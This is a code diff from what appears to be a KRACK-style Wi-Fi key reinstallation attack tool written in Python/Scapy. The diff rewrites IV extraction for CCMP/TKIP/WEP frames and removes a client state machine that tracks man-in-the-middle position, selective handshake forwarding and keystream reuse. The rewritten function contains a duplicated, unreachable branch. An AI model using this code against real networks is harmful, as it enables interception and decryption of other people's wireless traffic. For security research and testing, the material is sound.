@@ -51,15 +51,51 @@ def dot11_get_seqnum(p):
 	# .... .... .... (....)對齊用
 	return p[Dot11].SC >> 4
 
+def payload_to_iv(payload):
+	iv0 = payload[0]
+	iv1 = payload[1]
+	wepdata = payload[4:8]
+
+	return orb(iv0) + (orb(iv1) << 8) + (struct.unpack(">I", wepdata)[0] << 16)
+
 def dot11_get_iv(p):
-	if not p.haslayer(Dot11WEP):
-		log(ERROR, "INTERNAL ERROR: Requested IV of plaintext frame")
-		return 0
-	wep = p[Dot11WEP]
-	if wep.keyid & 32:
-		return ord(wep.iv[0]) + (ord(wep.iv[1]) << 8) + (struct.unpack(">I", wep.wepdata[:4])[0] << 16)
+	"""
+	Assume it's a CCMP frame. Old scapy can't handle Extended IVs.
+	This code only works for CCMP frames.
+	"""
+	if Dot11CCMP in p:
+		payload = raw(p[Dot11CCMP])
+		return payload_to_iv(payload)
+
+	elif Dot11TKIP in p:
+		# Scapy uses a heuristic to differentiate CCMP/TKIP and this may be wrong.
+		# So even when we get a Dot11TKIP frame, we should treat it like a Dot11CCMP frame.
+		payload = raw(p[Dot11TKIP])
+		return payload_to_iv(payload)
+
+	if Dot11CCMP in p:
+		payload = raw(p[Dot11CCMP])
+		return payload_to_iv(payload)
+	elif Dot11TKIP in p:
+		payload = raw(p[Dot11TKIP])
+		return payload_to_iv(payload)
+	elif Dot11Encrypted in p:
+		payload = raw(p[Dot11Encrypted])
+		return payload_to_iv(payload)
+
+	elif Dot11WEP in p:
+		wep = p[Dot11WEP]
+		if wep.keyid & 32:
+			# FIXME: Only CCMP is supported (TKIP uses a different IV structure)
+			return orb(wep.iv[0]) + (orb(wep.iv[1]) << 8) + (struct.unpack(">I", wep.wepdata[:4])[0] << 16)
+		else:
+			return orb(wep.iv[0]) + (orb(wep.iv[1]) << 8) + (orb(wep.iv[2]) << 16)
+
+	elif p.FCfield & 0x40:
+		return payload_to_iv(p[Raw].load)
+
 	else:
-		return int.from_bytes(wep.iv, 'little')
+		return None
 
 def dot11_get_tid(p):
 	if p.haslayer(Dot11QoS):
@@ -225,73 +261,3 @@ class MitmSocket(L2Socket):
 	def close(self):
 		if self.pcap: self.pcap.close()
 		super(MitmSocket, self).close()
-
-
-class ClientState():
-	Initializing, Connecting, GotMitm, Attack_Started, Success_Reinstalled, Success_AllzeroKey, Failed = range(7)
-
-	def __init__(self, macaddr):
-		self.macaddr = macaddr
-		self.reset()
-
-	def reset(self):
-		self.state = ClientState.Initializing
-		self.keystreams = dict()
-		self.attack_max_iv = None
-		self.attack_time = None
-
-		self.assocreq = None
-		self.msg1 = None
-		self.msg3s = []
-		self.msg4 = None
-		self.krack_finished = False
-
-	def store_msg1(self, msg1):
-		self.msg1 = msg1
-
-	def add_if_new_msg3(self, msg3):
-		if get_eapol_replaynum(msg3) in [get_eapol_replaynum(p) for p in self.msg3s]:
-			return
-		self.msg3s.append(msg3)
-
-	def update_state(self, state):
-		log(DEBUG, "Client %s moved to state %d" % (self.macaddr, state), showtime=False)
-		self.state = state
-
-	def mark_got_mitm(self):
-		if self.state <= ClientState.Connecting:
-			self.state = ClientState.GotMitm
-			log(STATUS, "Established MitM position against client %s (moved to state %d)" % (self.macaddr, self.state),
-				color="green", showtime=False)
-
-	def is_state(self, state):
-		return self.state == state
-
-	def should_forward(self, p, group):
-		if group:
-			# Forwarding rules when attacking the group handshake
-			return True
-		else:
-			# Forwarding rules when attacking the 4-way handshake
-			if self.state in [ClientState.Connecting, ClientState.GotMitm, ClientState.Attack_Started]:
-				# Also forward Action frames (e.g. Broadcom AP waits for ADDBA Request/Response before starting 4-way HS).
-				# 四次交握不轉送 msg2 & msg4
-				return p.haslayer(Dot11Auth) or p.haslayer(Dot11AssoReq) or p.haslayer(Dot11AssoResp) or (1 <= get_eapol_msgnum(p) and get_eapol_msgnum(p) <= 3) or (p.type == 0 and p.subtype == 13)
-			return self.state in [ClientState.Success_Reinstalled]
-
-	def save_iv_keystream(self, iv, keystream):
-		self.keystreams[iv] = keystream
-
-	def get_keystream(self, iv):
-		return self.keystreams[iv]
-
-	def attack_start(self):
-		self.attack_max_iv = 0 if len(self.keystreams.keys()) == 0 else max(self.keystreams.keys())
-		self.attack_time = time.time()
-		self.update_state(ClientState.Attack_Started)
-
-	def is_iv_reused(self, iv):
-		return self.is_state(ClientState.Attack_Started) and iv in self.keystreams
-
-	def attack_timeout(self, iv):
-		return self.is_state(ClientState.Attack_Started) and self.attack_time + 1.5 < time.time() and self.attack_max_iv < iv
